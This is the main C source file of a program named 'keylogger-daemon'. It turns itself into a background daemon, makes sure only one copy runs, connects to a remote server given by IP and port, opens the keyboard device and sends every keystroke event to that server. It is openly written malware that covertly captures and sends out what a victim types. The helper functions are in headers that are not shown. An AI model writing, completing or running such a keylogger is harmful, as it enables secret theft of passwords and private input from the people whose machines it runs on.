#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include "daemon.h"
#include "keylogger.h"

int main(int argc, char *argv[])
{
    int keyboard;
    int server;
    int flock;

    if (argc != 3) /* Usage: ./keylogger-daemon ip port */
        exit(EXIT_FAILURE);

    if (!daemonize()) /* Convert process to daemon */
        exit(EXIT_FAILURE);

    if (daemonAlreadyRunning(&flock)) /* If another instance of keylogger is already running, or could not acquire write lock then we exit */
        exit(EXIT_FAILURE);

    if (!(server = openConnectionWithServer(argv[1], atoi(argv[2])))) /* Connecting with server */
        exit(EXIT_FAILURE);

    if (!keyboardFound(DEVICES_PATH, &keyboard))
        exit(EXIT_FAILURE);

    startKeylogger(keyboard, server); /* Reading from keyboard device and sending events to server */

    close(flock); /* Closing lock file */
    exit(EXIT_SUCCESS);
}
